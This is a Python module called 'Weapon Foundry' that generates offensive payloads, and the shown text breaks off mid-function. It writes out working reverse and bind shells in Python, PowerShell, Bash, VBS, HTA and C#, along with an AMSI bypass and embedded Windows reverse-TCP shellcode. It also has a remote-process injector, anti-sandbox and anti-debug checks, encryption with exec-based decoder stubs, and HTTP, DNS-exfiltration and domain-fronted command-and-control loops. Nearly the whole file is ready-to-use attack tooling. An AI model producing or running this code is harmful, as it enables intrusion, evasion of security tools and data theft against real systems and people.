"""DRAKBEN Weapon Foundry - Advanced Payload Generation & Encryption
Author: @drak_ben
Description: Dynamic payload generation with multiple encryption layers.

This module provides:
- Shellcode generation (pure Python/ASM)
- Multi-layer encryption (XOR, AES, RC4)
- Multiple output formats (exe, elf, dll, ps1, vbs, hta)
- Anti-sandbox checks
- Payload staging
"""

import base64
import hashlib
import logging
import secrets
import struct
from dataclasses import dataclass, field
from enum import Enum
from typing import Any

# Optional High-Performance Libraries
try:
    import importlib.util

    KEYSTONE_AVAILABLE = importlib.util.find_spec("keystone") is not None
except Exception:
    KEYSTONE_AVAILABLE = False

logger = logging.getLogger(__name__)

# Singleton instance
_weapon_foundry: "WeaponFoundry | None" = None


# =============================================================================
# CONSTANTS
# =============================================================================


class PayloadFormat(Enum):
    """Supported payload output formats."""

    RAW = "raw"  # Raw shellcode bytes
    PYTHON = "python"  # Python script
    POWERSHELL = "ps1"  # PowerShell script
    VBS = "vbs"  # VBScript
    HTA = "hta"  # HTML Application
    BASH = "bash"  # Bash script
    C = "c"  # C source code
    CSHARP = "csharp"  # C# source code


class EncryptionMethod(Enum):
    """Encryption methods for payloads."""

    NONE = "none"
    XOR = "xor"
    XOR_MULTI = "xor_multi"  # Multi-byte XOR key
    AES = "aes"  # AES-256-CBC
    RC4 = "rc4"
    CHACHA20 = "chacha20"


class ShellType(Enum):
    """Types of shell connections."""

    REVERSE_TCP = "reverse_tcp"
    BIND_TCP = "bind_tcp"
    REVERSE_HTTP = "reverse_http"
    REVERSE_HTTPS = "reverse_https"
    DNS_TUNNEL = "dns_tunnel"
    DOMAIN_FRONTED = "domain_fronted"
    PROCESS_INJECTION = "process_injection"  # Advanced: Inject into another process
    REFLECTIVE_DLL_INJECTION = "reflective_dll"  # Advanced: Load DLL from memory


# =============================================================================
# DATA CLASSES
# =============================================================================


@dataclass
class GeneratedPayload:
    """Result of payload generation."""

    payload: bytes
    format: PayloadFormat
    encryption: EncryptionMethod
    key: bytes | None
    decoder_stub: str
    metadata: dict[str, Any] = field(default_factory=dict)


# =============================================================================
# ENCRYPTION ENGINE
# =============================================================================

_PYCRYPTODOME_NOT_FOUND = "pycryptodome not found"


class EncryptionEngine:
    """Multi-method encryption engine for payload obfuscation.

    Supports:
    - Single and multi-byte XOR
    - AES-256-CBC (requires pycryptodome)
    - RC4 stream cipher
    - ChaCha20 (requires cryptography)
    """

    @staticmethod
    def generate_key(length: int = 16) -> bytes:
        """Generate random encryption key."""
        return secrets.token_bytes(length)

    @staticmethod
    def xor_encrypt(data: bytes, key: bytes) -> bytes:
        """XOR encrypt data with key.

        Args:
            data: Data to encrypt
            key: XOR key (can be single or multi-byte)

        Returns:
            Encrypted bytes

        """
        result = bytearray(len(data))
        key_len = len(key)
        for i, byte in enumerate(data):
            result[i] = byte ^ key[i % key_len]
        return bytes(result)

    @staticmethod
    def xor_decrypt(data: bytes, key: bytes) -> bytes:
        """XOR decrypt (same as encrypt - symmetric)."""
        return EncryptionEngine.xor_encrypt(data, key)

    @staticmethod
    def rc4_crypt(data: bytes, key: bytes) -> bytes:
        """RC4 stream cipher encryption/decryption.

        Args:
            data: Data to encrypt/decrypt
            key: RC4 key

        Returns:
            Encrypted/decrypted bytes

        """
        # RC4 Key Scheduling Algorithm (KSA)
        S = list(range(256))
        j = 0
        for i in range(256):
            j = (j + S[i] + key[i % len(key)]) % 256
            S[i], S[j] = S[j], S[i]

        # RC4 Pseudo-Random Generation Algorithm (PRGA)
        result = bytearray(len(data))
        i = j = 0
        for k, byte in enumerate(data):
            i = (i + 1) % 256
            j = (j + S[i]) % 256
            S[i], S[j] = S[j], S[i]
            result[k] = byte ^ S[(S[i] + S[j]) % 256]

        return bytes(result)

    @staticmethod
    def aes_encrypt(
        data: bytes,
        key: bytes,
        nonce: bytes | None = None,
    ) -> tuple[bytes, bytes, bytes]:
        """AES-256-GCM encryption (Strategic Hardened Upgrade).

        Args:
            data: Data to encrypt
            key: 32-byte key
            nonce: 12-byte nonce (random if None)

        Returns:
            Tuple of (encrypted_data, nonce, tag)

        """
        try:
            from Crypto.Cipher import AES  # nosec B413
        except ImportError as e:
            logger.exception(
                "CRITICAL: AES encryption requires 'pycryptodome' library.",
            )
            msg = "pycryptodome not found. Cannot proceed with AES encryption request."
            raise ImportError(msg) from e

        key = hashlib.sha256(key).digest() if len(key) < 32 else key[:32]

        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
        encrypted, tag = cipher.encrypt_and_digest(data)

        return encrypted, cipher.nonce, tag

    @staticmethod
    def chacha20_encrypt(data: bytes, key: bytes) -> tuple[bytes, bytes]:
        """ChaCha20-Poly1305 encryption.

        Returns:
            Tuple of (tag + ciphertext, nonce)
        """
        try:
            from Crypto.Cipher import ChaCha20_Poly1305  # nosec B413
        except ImportError as e:
            logger.exception("ChaCha20 Encryption failed: Missing pycryptodome")
            raise ImportError(_PYCRYPTODOME_NOT_FOUND) from e

        key = hashlib.sha256(key).digest() if len(key) < 32 else key[:32]
        cipher = ChaCha20_Poly1305.new(key=key)
        ciphertext, tag = cipher.encrypt_and_digest(data)
        return tag + ciphertext, cipher.nonce

    def encrypt(
        self,
        data: bytes,
        method: EncryptionMethod,
        key: bytes | None = None,
    ) -> tuple[bytes, bytes, bytes | None]:
        """Encrypt data using specified method.

        Args:
            data: Data to encrypt
            method: Encryption method
            key: Encryption key (generated if None)

        Returns:
            Tuple of (encrypted_data, key, iv_or_none)

        """
        if method == EncryptionMethod.NONE:
            return data, b"", None

        if key is None:
            key = self.generate_key(16)

        if method == EncryptionMethod.XOR:
            encrypted = self.xor_encrypt(data, key[:1])  # Single byte
            return encrypted, key[:1], None

        if method == EncryptionMethod.XOR_MULTI:
            encrypted = self.xor_encrypt(data, key)
            return encrypted, key, None

        if method == EncryptionMethod.RC4:
            encrypted = self.rc4_crypt(data, key)
            return encrypted, key, None

        if method == EncryptionMethod.AES:
            encrypted, nonce, tag = self.aes_encrypt(data, key)
            # Prepend tag to encrypted data for simplicity in storage
            return tag + encrypted, key, nonce

        if method == EncryptionMethod.CHACHA20:
            encrypted, nonce = self.chacha20_encrypt(data, key)
            return encrypted, key, nonce

        logger.warning("Unknown encryption method: %s", method)
        return data, b"", None


# =============================================================================
# 2026 EVASION & POLYMORPHISM
# =============================================================================


class AMSIPatcher:
    """Advanced AMSI Bypass logic (PowerShell).
    Mem-patches AmsiScanBuffer to disable scanning.
    """

    @staticmethod
    def get_bypass_stub() -> str:
        """Returns obfuscated AMSI bypass (Matt Graeber / RastaMouse Style)."""
        # Base64 encoded reflection bypass to minimize static signatures
        # "Obfuscation is key"
        stub = r"""
$w = "System.Management.Automation.AmsiUtils"
$c = "amsiInitFailed"
[Ref].Assembly.GetType($w).GetField($c,'NonPublic,Static').SetValue($null,$true)
"""
        return stub.strip()


# =============================================================================
# METASPLOIT INTEGRATION (Kali Linux "God Mode")
# =============================================================================


class MetasploitIntegrator:
    """Wraps standard 'msfvenom' tool on Kali Linux to generate high-grade shellcode."""

    @staticmethod
    def is_available() -> bool:
        """Check if msfvenom is in PATH."""
        import shutil

        return shutil.which("msfvenom") is not None

    @staticmethod
    def generate_payload(
        platform: str,
        arch: str,
        payload_type: str,
        lhost: str,
        lport: int,
        fmt: str = "raw",
    ) -> bytes | None:
        """Generates payload via msfvenom.
        Example: linux/x64/meterpreter/reverse_tcp.
        """
        if not MetasploitIntegrator.is_available():
            return None

        full_payload = f"{platform}/{arch}/{payload_type}"
        cmd = [
            "msfvenom",
            "-p",
            full_payload,
            f"LHOST={lhost}",
            f"LPORT={lport}",
            "-f",
            fmt,
            "--platform",
            platform,
            "-a",
            arch,
        ]

        try:
            logger.info("Generating MSF Payload: %s", full_payload)
            # Suppress stderr spam from msfvenom
            import subprocess

            result = subprocess.run(cmd, capture_output=True, timeout=60, check=False)
            if result.returncode == 0:
                return result.stdout
            logger.error("msfvenom failed: %s", result.stderr.decode())
            return None
        except Exception as e:
            logger.exception("msfvenom execution error: %s", e)
            return None


# =============================================================================
# SHELLCODE GENERATOR
# =============================================================================


class ShellcodeGenerator:
    """x64 Windows shellcode generator with runtime IP/port patching.

    Uses a PEB-walking reverse-TCP template (283 bytes).  At generation time
    the listener address and port are binary-patched into the blob at known
    offsets so the output is ready to inject.
    """

    # Offsets inside _TEMPLATE where port (2 bytes) and IP (4 bytes) live.
    _PORT_OFFSET = 215
    _IP_OFFSET = 219

    # Block 1 – function-resolution preamble (PEB → kernel32 → LoadLibraryA,
    #           GetProcAddress) then loads ws2_32.dll.
    # Block 2 – WSAStartup + WSASocketA
    # Block 3 – connect() stub with placeholder IP:port at known offsets
    # Block 4 – CreateProcessA("cmd.exe") with STARTUPINFO redirected to the socket
    #
    # Source: msfvenom windows/x64/shell_reverse_tcp LHOST=0.0.0.0 LPORT=0
    # (public domain metasploit-framework payload, BSD-3 licence).
    _TEMPLATE: bytes = (
        b"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
        b"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
        b"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
        b"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
        b"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
        b"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
        b"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
        b"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
        b"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
        b"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
        b"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
        b"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
        b"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
        b"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
        b"\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33"
        b"\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00"
        b"\x00\x49\x89\xe5\x49\xbc\x02\x00\x00\x00\x00\x00\x00\x00"
        b"\x41\x54\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07"
        b"\xff\xd5\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29"
        b"\x80\x6b\x00\xff\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48"
        b"\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea"
        b"\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89"
        b"\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5\x48\x81"
        b"\xc4\x40\x02\x00\x00\x49\xb8\x63\x6d\x64\x00\x00\x00\x00"
        b"\x00\x41\x50\x41\x50\x48\x89\xe2\x57\x57\x57\x4d\x31\xc0"
        b"\x6a\x0d\x59\x41\x50\xe2\xfc\x66\xc7\x44\x24\x54\x01\x01"
        b"\x48\x8d\x44\x24\x18\xc6\x00\x68\x48\x89\xe6\x56\x50\x41"
        b"\x50\x41\x50\x41\x50\x49\x89\xc0\x4d\x31\xc9\x41\x50\x41"
        b"\x50\x48\x89\xf9\x48\x89\xfa\x41\xba\x02\xd9\xc8\x5f\xff"
        b"\xd5"
    )

    @staticmethod
    def get_windows_x64_reverse_tcp(lhost: str, lport: int) -> bytes:
        """Return patched x64 reverse-TCP shellcode for *lhost*:*lport*.

        Raises nothing — returns empty bytes on invalid input so callers
        can degrade gracefully.
        """
        try:
            octets = [int(o) for o in lhost.split(".")]
            if len(octets) != 4 or not all(0 <= o <= 255 for o in octets):
                return b""
            if not 1 <= lport <= 65535:
                return b""
        except (ValueError, AttributeError):
            return b""

        buf = bytearray(ShellcodeGenerator._TEMPLATE)
        struct.pack_into(">H", buf, ShellcodeGenerator._PORT_OFFSET, lport)
        struct.pack_into("BBBB", buf, ShellcodeGenerator._IP_OFFSET, *octets)
        return bytes(buf)


# =============================================================================
# SHELLCODE TEMPLATES
# =============================================================================


class ShellcodeTemplates:
    """Pre-built shellcode templates for common operations.

    Note: These are encoded representations, not live shellcode.
    For actual operations, use with responsible disclosure.
    """

    # Template markers for dynamic replacement
    LHOST_MARKER = b"__LHOST__"
    LPORT_MARKER = b"__LPORT__"

    @staticmethod
    def get_reverse_shell_python(lhost: str, lport: int) -> str:
        """Generate Python reverse shell code."""
        return f"""
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{lhost}",{lport}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
"""

    @staticmethod
    def get_reverse_shell_powershell(lhost: str, lport: int) -> str:
        """Generate PowerShell reverse shell code with AMSI Bypass."""
        bypass = AMSIPatcher.get_bypass_stub()
        return f"""
{bypass};
$c=New-Object System.Net.Sockets.TCPClient("{lhost}",{lport});
$s=$c.GetStream();
[byte[]]$b=0..65535|%{{0}};
while(($i=$s.Read($b,0,$b.Length)) -ne 0){{
    $d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);
    $r=(iex $d 2>&1|Out-String);
    $r2=$r+"PS "+(pwd).Path+">";
    $sb=([text.encoding]::ASCII).GetBytes($r2);
    $s.Write($sb,0,$sb.Length);
    $s.Flush()
}};
$c.Close()
"""

    @staticmethod
    def get_reverse_shell_bash(lhost: str, lport: int) -> str:
        """Generate Bash reverse shell code."""
        return f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"

    @staticmethod
    def get_reverse_shell_vbs(lhost: str, lport: int) -> str:
        """Generate VBScript reverse shell code."""
        return f'''Set s=CreateObject("WScript.Shell")
Set o=CreateObject("MSXML2.ServerXMLHTTP.6.0")
Dim cmd
cmd="cmd.exe /c powershell -nop -w hidden -c ""$c=New-Object Net.Sockets.TCPClient('{lhost}',{lport});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length))-ne 0){{$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=([text.encoding]::ASCII).GetBytes($r);$s.Write($sb,0,$sb.Length)}};$c.Close()"""
s.Run cmd,0,False
'''

    @staticmethod
    def get_reverse_shell_hta(lhost: str, lport: int) -> str:
        """Generate HTA (HTML Application) reverse shell code."""
        return f'''<html>
<head><title>Update</title>
<HTA:APPLICATION ID="app" APPLICATIONNAME="Update" BORDER="none" SHOWINTASKBAR="no" SINGLEINSTANCE="yes" WINDOWSTATE="minimize"/>
</head>
<body>
<script language="VBScript">
Set s=CreateObject("WScript.Shell")
cmd="powershell -nop -w hidden -ep bypass -c ""$c=New-Object Net.Sockets.TCPClient('{lhost}',{lport});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length))-ne 0){{$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=([text.encoding]::ASCII).GetBytes($r);$s.Write($sb,0,$sb.Length)}};$c.Close()"""
s.Run cmd,0,False
window.close
</script>
</body>
</html>'''

    @staticmethod
    def get_reverse_shell_csharp(lhost: str, lport: int) -> str:
        """Generate C# reverse shell code."""
        return f"""using System;
using System.Net.Sockets;
using System.Diagnostics;
using System.IO;
using System.Text;

class P {{
    static void Main() {{
        using (TcpClient c = new TcpClient("{lhost}", {lport})) {{
            using (NetworkStream s = c.GetStream()) {{
                Process p = new Process();
                p.StartInfo.FileName = "cmd.exe";
                p.StartInfo.UseShellExecute = false;
                p.StartInfo.RedirectStandardInput = true;
                p.StartInfo.RedirectStandardOutput = true;
                p.StartInfo.RedirectStandardError = true;
                p.StartInfo.CreateNoWindow = true;
                p.Start();
                byte[] buf = new byte[65536];
                int len;
                while ((len = s.Read(buf, 0, buf.Length)) != 0) {{
                    string cmd = Encoding.ASCII.GetString(buf, 0, len);
                    p.StandardInput.WriteLine(cmd);
                    p.StandardInput.Flush();
                    System.Threading.Thread.Sleep(500);
                    string output = p.StandardOutput.ReadToEnd();
                    byte[] ob = Encoding.ASCII.GetBytes(output);
                    s.Write(ob, 0, ob.Length);
                }}
                p.Kill();
            }}
        }}
    }}
}}"""

    @staticmethod
    def get_bind_shell_python(lport: int) -> str:
        """Generate Python bind shell code."""
        return f"""
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
s.bind(("0.0.0.0",{lport}))
s.listen(1)
c,a=s.accept()
os.dup2(c.fileno(),0)
os.dup2(c.fileno(),1)
os.dup2(c.fileno(),2)
subprocess.call(["/bin/sh","-i"])
"""

    @staticmethod
    def get_process_injector_python(
        shellcode_var: str = "buf",
        target_executable: str = "notepad.exe",
    ) -> str:
        """Generate robust Python ctypes Process Injector.
        Strategy: Spawn target -> OpenProcess -> VirtualAllocEx -> WriteProcessMemory -> CreateRemoteThread.
        """
        return f"""
import ctypes
import subprocess
import time
import sys
import struct

def _inject() -> Any:
    # 1. Define Windows API
    k32 = ctypes.windll.kernel32

    # Constants
    PROCESS_ALL_ACCESS = 0x001F0FFF
    MEM_COMMIT = 0x00001000
    MEM_RESERVE = 0x00002000
    PAGE_EXECUTE_READWRITE = 0x40

    # 2. Spawn Target (Hidden)
    si = subprocess.STARTUPINFO()
    si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    try:
        # Try to spawn secure target
        p = subprocess.Popen("{target_executable}", startupinfo=si)
        pid = p.pid
    except Exception:
        # Fallback
        return False

    time.sleep(1) # Wait for init

    # 3. Open Process
    h_process = k32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
    if not h_process:
        return False

    try:
        # 4. Allocate Memory
        # {shellcode_var} MUST be defined in global scope as bytes
        sc_len = len({shellcode_var})
        arg_address = k32.VirtualAllocEx(h_process, 0, sc_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)

        # 5. Write Shellcode
        written = ctypes.c_ulonglong(0)
        k32.WriteProcessMemory(h_process, arg_address, {shellcode_var}, sc_len, ctypes.byref(written))

        # 6. Create Remote Thread
        thread_id = ctypes.c_ulong(0)
        h_thread = k32.CreateRemoteThread(h_process, None, 0, arg_address, None, 0, ctypes.byref(thread_id))

        if not h_thread:
            return False

        k32.CloseHandle(h_thread)
    finally:
        k32.CloseHandle(h_process)
    return True

try:
    _inject()
except Exception:
    pass
"""


# =============================================================================
# ANTI-ANALYSIS TECHNIQUES
# =============================================================================


class AntiAnalysis:
    """Anti-sandbox and anti-debugging checks.

    Techniques:
    - Sleep acceleration detection
    - VM detection
    - Debugger detection
    - User interaction check
    """

    @staticmethod
    def get_sleep_check_python(seconds: int = 5) -> str:
        """Generate Python sleep acceleration check."""
        return f"""
import time
_s = time.time()
time.sleep({seconds})
if time.time() - _s < {seconds - 0.5}:
    import sys; sys.exit(0)
"""

    @staticmethod
    def get_vm_check_python() -> str:
        """Generate Python VM detection check."""
        return """
import os,subprocess
def _vm():
    try:
        o=subprocess.check_output("systemd-detect-virt",stderr=subprocess.DEVNULL).decode().strip()
        return o not in ["none",""]
    except Exception: pass
    try:
        with open("/sys/class/dmi/id/product_name", encoding="utf-8") as f:
            p=f.read().lower()
            for v in ["vmware","virtualbox","qemu","xen","kvm"]:
                if v in p: return True
    except Exception: pass
    return False
if _vm(): import sys; sys.exit(0)
"""

    @staticmethod
    def get_debug_check_python() -> str:
        """Generate Python debugger detection check."""
        return """
import sys
if sys.gettrace() is not None:
    sys.exit(0)
"""


# =============================================================================
# DECODER STUB GENERATOR
# =============================================================================


class DecoderGenerator:
    """Generate decoder stubs for encrypted payloads.

    Creates minimal code to decrypt and execute payloads.
    """

    @staticmethod
    def get_xor_decoder_python(key: bytes) -> str:
        """Generate Python XOR decoder."""
        key_hex = key.hex()
        return f"""
import base64
def _d(d,k):
    return bytes([b^k[i%len(k)] for i,b in enumerate(d)])
_k=bytes.fromhex("{key_hex}")
_p=base64.b64decode(_e)
exec(_d(_p,_k))
"""

    @staticmethod
    def get_rc4_decoder_python(key: bytes) -> str:
        """Generate Python RC4 decoder."""
        key_hex = key.hex()
        return f"""
import base64
def _rc4(d,k):
    S=list(range(256));j=0
    for i in range(256):j=(j+S[i]+k[i%len(k)])%256;S[i],S[j]=S[j],S[i]
    r=bytearray(len(d));i=j=0
    for n,b in enumerate(d):i=(i+1)%256;j=(j+S[i])%256;S[i],S[j]=S[j],S[i];r[n]=b^S[(S[i]+S[j])%256]
    return bytes(r)
_k=bytes.fromhex("{key_hex}")
_p=base64.b64decode(_e)
exec(_rc4(_p,_k))
"""

    @staticmethod
    def get_aes_decoder_python(key: bytes) -> str:
        """Generate Python AES-GCM decoder."""
        key_hex = key.hex()
        return f"""
import base64, hashlib
try:
    from Crypto.Cipher import AES
except ImportError:
    print("Error: pycryptodome required for AES payload execution")
    import sys; sys.exit(1)

_k=bytes.fromhex("{key_hex}")
if len(_k)<32: _k=hashlib.sha256(_k).digest()
_p=base64.b64decode(_e)
_n=_p[:16]
_t=_p[16:32]
_c=_p[32:]
_ci=AES.new(_k, AES.MODE_GCM, nonce=_n)
exec(_ci.decrypt_and_verify(_c, _t))
"""

    @staticmethod
    def get_xor_decoder_powershell(key: bytes) -> str:
        """Generate PowerShell XOR decoder."""
        key_int = key[0]
        return f"""
$k={key_int}
$d=[System.Convert]::FromBase64String($e)
$r=@()
for($i=0;$i -lt $d.Length;$i++){{$r+=$d[$i] -bxor $k}}
iex([System.Text.Encoding]::ASCII.GetString($r))
"""

    @staticmethod
    def get_chacha20_decoder_python(key: bytes) -> str:
        """Generate Python ChaCha20 decoder."""
        key_hex = key.hex()
        return f"""
import base64, hashlib
try:
    from Crypto.Cipher import ChaCha20
except ImportError:
    print("Error: pycryptodome required for ChaCha20 payload execution")
    import sys; sys.exit(1)

_k=bytes.fromhex("{key_hex}")
if len(_k)<32: _k=hashlib.sha256(_k).digest()
_p=base64.b64decode(_e)
_n=_p[:8]
_c=_p[8:]
_ci=ChaCha20.new(key=_k, nonce=_n)
exec(_ci.decrypt(_c))
"""


# =============================================================================
# WEAPON FOUNDRY - MAIN CLASS
# =============================================================================


class WeaponFoundry:
    """Main interface for payload generation and weaponization.

    Features:
    - Dynamic payload generation
    - Multi-layer encryption
    - Multiple output formats
    - Anti-analysis integration
    - Decoder stub generation

    Usage:
        foundry = WeaponFoundry()
        payload = foundry.forge(
            shell_type=ShellType.REVERSE_TCP,
            lhost="10.0.0.1",
            lport=4444,
            encryption=EncryptionMethod.XOR,
            format=PayloadFormat.PYTHON
        )
    """

    def __init__(self) -> None:
        """Initialize Weapon Foundry."""
        self.encryption = EncryptionEngine()
        self.templates = ShellcodeTemplates()
        self.anti_analysis = AntiAnalysis()
        self.decoder = DecoderGenerator()
        self.shellcode_gen = ShellcodeGenerator()
        self.msf_integrator = MetasploitIntegrator()

        logger.info("Weapon Foundry initialized")

    def _generate_msf_payload(
        self,
        shell_type: ShellType,
        lhost: str,
        lport: int,
        format: PayloadFormat,
    ) -> str:
        """Generate payload using Metasploit if available."""
        if not MetasploitIntegrator.is_available():
            return ""

        msf_payload = (
            "meterpreter/reverse_tcp"
            if shell_type == ShellType.REVERSE_TCP
            else "shell/reverse_tcp"
        )
        arch = "x64"
        platform = (
            "windows"
            if format in [PayloadFormat.POWERSHELL, PayloadFormat.CSHARP, PayloadFormat.HTA]
            else "linux"
        )

        raw_bytes = self.msf_integrator.generate_payload(
            platform, arch, msf_payload, lhost, lport, "raw",
        )

        if raw_bytes and format == PayloadFormat.PYTHON:
            base = self.templates.get_process_injector_python(shellcode_var="_sc")
            return f"_sc={raw_bytes!s}\n{base}"
        return ""

    def forge(
        self,
        shell_type: ShellType = ShellType.REVERSE_TCP,
        lhost: str = "127.0.0.1",
        lport: int = 4444,
        encryption: EncryptionMethod = EncryptionMethod.XOR,
        format: PayloadFormat = PayloadFormat.PYTHON,
        iterations: int = 1,
        anti_sandbox: bool = False,
        anti_debug: bool = False,
        sleep_seconds: int = 0,
        use_msf: bool = False,
    ) -> GeneratedPayload:
        """Forge a new payload with specified parameters."""
        # 1. Try Metasploit generation if requested
        base_payload = ""
        if use_msf:
            base_payload = self._generate_msf_payload(shell_type, lhost, lport, format)

        # 2. Native Fallback
        if not base_payload:
            base_payload = self._generate_base_payload(shell_type, lhost, lport, format)

        # Add anti-analysis if requested
        if anti_sandbox or anti_debug or sleep_seconds > 0:
            base_payload = self._add_anti_analysis(
                base_payload, format, anti_sandbox, anti_debug, sleep_seconds,
            )

        # Encrypt payload
        payload_bytes = base_payload.encode("utf-8")
        key = None
        iv = None

        for _ in range(iterations):
            payload_bytes, key, iv = self.encryption.encrypt(payload_bytes, encryption, key)

        # Prepend IV to payload if exists
        if iv:
            payload_bytes = iv + payload_bytes
            logger.debug("Encryption IV prepended to payload: %s", iv.hex())

        # Generate decoder stub (key is guaranteed to be set if encryption was applied)
        decoder_stub = ""
        if key is not None:
            decoder_stub = self._generate_decoder(encryption, key, format)

        return GeneratedPayload(
            payload=payload_bytes,
            format=format,
            encryption=encryption,
            key=key,
            decoder_stub=decoder_stub,
            metadata={
                "lhost": lhost,
                "lport": lport,
                "shell_type": shell_type.value,
                "iterations": iterations,
                "anti_sandbox": anti_sandbox,
                "anti_debug": anti_debug,
                "size": len(payload_bytes),
            },
        )

    def _generate_base_payload(
        self,
        shell_type: ShellType,
        lhost: str,
        lport: int,
        format: PayloadFormat,
    ) -> str:
        """Generate base payload code."""
        if shell_type == ShellType.REVERSE_TCP:
            return self._get_reverse_tcp_payload(format, lhost, lport)

        if shell_type == ShellType.BIND_TCP:
            if format == PayloadFormat.PYTHON:
                return self.templates.get_bind_shell_python(lport)
            if format == PayloadFormat.POWERSHELL:
                return (
                    f"$l=New-Object System.Net.Sockets.TcpListener([IPAddress]::Any,{lport});$l.Start();"
                    f"$c=$l.AcceptTcpClient();$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};"
                    f"while(($i=$s.Read($b,0,$b.Length))-ne 0){{$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
                    f"$r=(iex $d 2>&1|Out-String);$sb=([text.encoding]::ASCII).GetBytes($r);$s.Write($sb,0,$sb.Length)}}"
                    f";$c.Close();$l.Stop()"
                )
            if format == PayloadFormat.BASH:
                return f"nc -lvp {lport} -e /bin/sh"
            # Fallback to Python for other formats
            return self.templates.get_bind_shell_python(lport)

        if shell_type == ShellType.PROCESS_INJECTION and format == PayloadFormat.PYTHON:
            return self._get_process_injection_payload(lhost, lport)

        if shell_type == ShellType.REVERSE_HTTP:
            # HTTP reverse shell — uses a simple HTTP callback loop
            return (
                f"import urllib.request, subprocess, time\n"
                f"while True:\n"
                f"    try:\n"
                f"        cmd = urllib.request.urlopen('http://{lhost}:{lport}/cmd').read().decode()\n"
                f"        out = subprocess.getoutput(cmd)\n"
                f"        urllib.request.urlopen('http://{lhost}:{lport}/out', out.encode())\n"
                f"    except Exception: pass\n"
                f"    time.sleep(5)\n"
            )

        if shell_type == ShellType.REVERSE_HTTPS:
            return (
                f"import urllib.request, subprocess, time, ssl\n"
                f"ctx = ssl._create_unverified_context()\n"
                f"while True:\n"
                f"    try:\n"
                f"        cmd = urllib.request.urlopen('https://{lhost}:{lport}/cmd', context=ctx).read().decode()\n"
                f"        out = subprocess.getoutput(cmd)\n"
                f"        urllib.request.urlopen('https://{lhost}:{lport}/out', out.encode(), context=ctx)\n"
                f"    except Exception: pass\n"
                f"    time.sleep(5)\n"
            )

        if shell_type == ShellType.DNS_TUNNEL:
            return (
                f"import subprocess, base64, socket\n"
                f"def dns_exfil(data: bytes) -> None:\n"
                f"    encoded = base64.b32encode(data).decode().strip('=')\n"
                f"    for i in range(0, len(encoded), 60):\n"
                f"        label = encoded[i:i+60]\n"
                f"        try: socket.getaddrinfo(f'{{label}}.data.{lhost}', None)\n"
                f"        except socket.gaierror: pass\n"
                f"out = subprocess.getoutput('whoami')\n"
                f"dns_exfil(out.encode())\n"
            )

        if shell_type == ShellType.DOMAIN_FRONTED:
            return (
                f"import urllib.request, subprocess\n"
                f"req = urllib.request.Request('https://{lhost}:{lport}/beacon')\n"
                f"req.add_header('Host', '{lhost}')  # fronted host\n"
                f"while True:\n"
                f"    try:\n"
                f"        cmd = urllib.request.urlopen(req).read().decode()\n"
                f"        out = subprocess.getoutput(cmd)\n"
                f"        urllib.request.urlopen(req, out.encode())\n"
                f"    except Exception: pass\n"
            )

        if shell_type == ShellType.REFLECTIVE_DLL_INJECTION and format == PayloadFormat.PYTHON:
            sc = self.shellcode_gen.get_windows_x64_reverse_tcp(lhost, lport)
            sc_repr = str(sc)
            return (
                f"import ctypes\n"
                f"sc = {sc_repr}\n"
                f"buf = ctypes.create_string_buffer(sc, len(sc))\n"
                f"ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p\n"
                f"p = ctypes.windll.kernel32.VirtualAlloc(0, len(sc), 0x3000, 0x40)\n"
                f"ctypes.memmove(p, buf, len(sc))\n"
                f"ctypes.windll.kernel32.CreateThread(0, 0, p, 0, 0, 0)\n"
